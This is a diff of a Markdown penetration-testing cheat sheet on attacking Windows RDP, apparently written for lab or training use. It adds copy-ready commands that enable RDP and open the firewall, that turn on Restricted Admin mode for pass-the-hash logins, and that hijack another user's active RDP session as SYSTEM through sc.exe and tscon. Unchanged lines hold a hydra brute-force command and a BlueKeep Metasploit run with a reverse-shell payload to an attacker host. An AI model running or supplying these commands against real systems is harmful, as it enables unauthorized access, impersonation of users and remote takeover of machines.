@@ -1,5 +1,6 @@
 **RDP** (Remote Desktop Protocol) is a proprietary protocol developed by Microsoft to allow users to remotely connect to and interact with a Windows-based machine using a graphical interface. It operates on port **3389** by default and supports remote desktop, file transfer, and application sharing.
 
+---
 
 ## Check if RDP is Enabled  
 Use tools like `nmap` to scan for open RDP ports and confirm the service.  
@@ -7,6 +8,8 @@ Use tools like `nmap` to scan for open RDP ports and confirm the service.
 ```bash
 nmap -p 3389 --script=rdp-enum-encryption <target>
 ```
+
+---
 
 ## Testing RDP with Credentials  
 `rdesktop`, `xfreerdp`, or `crackmapexec` can be used to validate login credentials for RDP.
@@ -53,6 +56,75 @@ Once connected via RDP, the shared directory is accessible at:
 It is also visible in **File Explorer → This PC** as a redirected drive.
 
 
+
+---
+## Enabling RDP
+
+The following commands enable RDP service and allow traffic through the firewall.
+
+```cmd
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+netsh advfirewall firewall set rule group="remote desktop" new enable=yes
+```
+
+---
+
+## Enabling Restricted Admin Mode (Pass-the-Hash Support)
+
+This allows RDP authentication using NTLM hashes without sending plaintext credentials.
+
+```cmd
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+Value meaning:
+
+- `0` → Restricted Admin enabled
+- `1` → Disabled (default on many systems)
+
+--- 
+
+## RDP Session Hijacking
+
+RDP Session Hijacking allows an attacker with **SYSTEM privileges** to take control of another active RDP session without knowing the user’s password.
+
+### Step 1 – Identify Active Sessions
+
+List logged-in users:
+
+```cmd
+query user
+```
+
+Example output:
+
+```
+USERNAME   SESSIONNAME   ID   STATE
+owned_user rdp-tcp#13    1    Active
+user2      rdp-tcp#14    2    Active
+```
+
+
+### Step 2 – Create Service to Execute tscon as SYSTEM
+
+```cmd
+sc.exe create <service_name> binpath= "cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<CURRENT_SESSION_NAME>"
+```
+
+- `<service_name>` → Arbitrary service name (e.g., `sessionhijack`)
+- `<TARGET_SESSION_ID>` → ID of the user session to hijack (from `query user`)
+- `<CURRENT_SESSION_NAME>` → Your current RDP session (e.g., `rdp-tcp#13`)
+### Step 3 – Start the Service
+
+```cmd
+net start <service_name>
+```
+
+When executed, the target user's desktop is attached to our session.
+
+We now operate as that user without needing their password.
+
 --- 
 
 ## Brute Force Attack on RDP  
@@ -63,7 +135,7 @@ hydra -l <username> -P <password_list> rdp://<target_ip>
 ```
 
 
---- 
+---
 
 ## BlueKeep
 **BlueKeep** is a critical vulnerability in the Remote Desktop Protocol (RDP) service of older Windows systems, identified as CVE-2019-0708. This exploit enables unauthenticated attackers to execute remote code on unpatched systems, potentially allowing full control over the affected machine.
@@ -101,27 +173,4 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <attacker_ip>
 set LPORT <port>
 exploit
-```
-
-
-## Enabling RDP
-
-The following commands enable RDP and allows traffic through the firewall.
-
-```bash
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-
-netsh advfirewall firewall set rule group="remote desktop" new enable=yes
-```
-
-#### Metasploit
-To enable RDP on a Windows target, you can use the **Metasploit module** `windows/manage/enable_rdp`.
- 1. Gain access to the target machine using a Meterpreter session.
- 2. Use the `windows/manage/enable_rdp` module.
-```bash
-use windows/manage/enable_rdp
-set RHOST <target_ip>
-set SESSION <seesion_id>
-set RPORT 3389
-run
 ```
